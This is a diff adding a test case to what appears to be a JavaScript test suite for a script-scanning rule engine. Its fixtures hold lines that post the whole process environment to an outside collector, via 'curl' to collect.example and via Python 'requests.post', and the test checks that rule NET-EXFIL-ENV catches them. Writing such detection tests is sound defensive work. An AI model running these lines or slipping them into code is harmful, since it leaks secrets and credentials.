@@ -463,6 +463,12 @@ describe('runRules', () => {
       text: '#!/usr/bin/env bash\nenv | curl -d @- https://collect.example\n',
       ruleIds: ['NET-EXFIL-ENV'],
     },
+    {
+      script: 'an extensionless python3.12 script with an env post',
+      name: 'setup',
+      text: '#!/usr/bin/env python3.12\nrequests.post(COLLECT_URL, json=os.environ)\n',
+      ruleIds: ['NET-EXFIL-ENV'],
+    },
     // The shell rules mask comments only when the script is prepared under its shell name.
     {
       script: 'an extensionless bash script with a commented-out env dump',
